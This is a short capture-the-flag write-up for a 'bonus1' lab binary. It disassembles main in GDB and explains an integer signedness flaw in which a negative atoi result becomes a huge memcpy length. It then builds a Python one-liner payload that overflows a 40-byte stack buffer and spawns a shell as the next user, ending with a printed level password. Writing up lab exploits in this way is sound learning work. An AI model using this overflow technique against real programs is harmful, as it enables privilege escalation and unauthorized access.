# Bonus 1

First step - testing the program
```
$ ./bonus1
Segmentation fault (core dumped)
$ ./bonus1 Hello
$ ./bonus1 Hello World
```
The program segfault without parameters

Start in GDB
```
(gdb)$ disas main
Dump of assembler code for function main:
   0x08048424 <+0>:		push   ebp
   0x08048425 <+1>:		mov    ebp,esp
   0x08048427 <+3>:		and    esp,0xfffffff0
   0x0804842a <+6>:		sub    esp,0x40
   0x0804842d <+9>:		mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
```
---

So, we have an atoi for `av[1]`. This result have to <= 9 for continue in the program.
A memcpy is done from `av[2]` to buffer with 40 bytes len and our av[1] for size_t param.
And for finish our integer have to be equal this time to *0x574f4c46* for call `execl("/bin/sh", "sh", 0)`

Like our integer and buffer are next to each other in the stack, we should exploit `memcpy` for overwrite buffer and give the correct final value and run `execl`


Thank `size_t` in memcpy, is an unsigned we can overflow with negative value.
We need to size_t be equal 44 bytes (40 for fill buffer, 4 for overwrite integer).

` 44 size_t == -2147483637 int`

Write exploit :

`python -c'print("-2147483637 "+ "A"*40 + "\x46\x4c\x4f\x57")' > payload`

Run :
```
$ ./bonus1 `cat payload `
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
